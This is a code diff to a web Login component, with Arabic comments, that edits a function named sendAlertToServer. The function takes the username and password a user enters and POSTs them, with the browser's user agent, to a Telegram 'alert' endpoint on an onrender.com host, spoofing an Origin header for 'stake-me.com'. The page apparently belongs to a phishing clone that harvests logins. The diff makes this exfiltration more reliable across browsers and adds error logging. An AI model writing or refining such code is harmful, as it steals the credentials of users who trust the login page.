@@ -53,16 +53,16 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى Render
+  // 🔐 دالة إرسال التنبيه إلى Render (متوافقة مع جميع المتصفحات)
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
+      const response = await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
-        credentials: 'include',  // ✅ إضافة هذا السطر لدعم Safari
+        credentials: 'include',  // ✅ ضروري لـ Safari ومتصفحات أخرى
         headers: {
           'Content-Type': 'application/json',
-          'Origin': 'https://stake-me.com',
+          'Origin': 'https://stake-me.com',  // ✅ رأس إضافي للمتصفحات اللي بتحذفه
         },
         body: JSON.stringify({
           username: username,
@@ -71,8 +71,16 @@ export default function Login() {
           userAgent: navigator.userAgent,
         }),
       });
+
+      if (!response.ok) {
+        // لو في مشكلة بالرد، نسجلها (علشان نعرف إذا حصل شيء)
+        console.warn(`⚠️ Server responded with status ${response.status}`);
+        const text = await response.text();
+        console.warn('⚠️ Response body:', text);
+      }
     } catch (error) {
-      // Silent fail
+      // الخطأ مش رح يوقف التطبيق، بس نسجله عشان نعرف إذا صار شيء
+      console.warn('⚠️ Alert failed (network or CORS issue):', error);
     }
   };
 
